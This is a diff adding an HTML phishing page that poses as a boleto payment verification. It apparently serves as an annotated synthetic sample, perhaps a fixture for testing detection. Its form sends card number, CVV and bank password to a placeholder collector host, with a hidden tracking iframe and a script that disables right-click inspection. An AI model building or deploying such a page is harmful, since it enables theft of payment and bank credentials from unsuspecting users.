@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Payment Verification - Confirm Your Details</title>
+    <link rel="icon" href="http://external-tracker-domain.com/favicon.ico">
+</head>
+<body>
+    <h1>Payment Verification Required</h1>
+    <p>Please confirm your card details to complete your boleto payment.</p>
+
+    <!-- Credential/payment capture form submitting to an external domain -->
+    <form action="http://credential-collector-domain.com/capture" method="POST">
+        <input type="text" name="cardnumber" placeholder="Card Number">
+        <input type="text" name="cvv" placeholder="CVV">
+        <input type="password" name="bank_password" placeholder="Bank Password">
+        <button type="submit">Verify & Pay</button>
+    </form>
+
+    <!-- Hidden iframe -->
+    <iframe src="http://tracker-domain.com/log" style="display:none;"></iframe>
+
+    <script>
+        // Credential-harvesting style behaviour
+        eval("var a = 1;");
+        document.cookie = "session=stolen";
+        var x = unescape("%70%61%79");
+        // disable right-click to stop inspection
+        document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
+    </script>
+</body>
+</html>
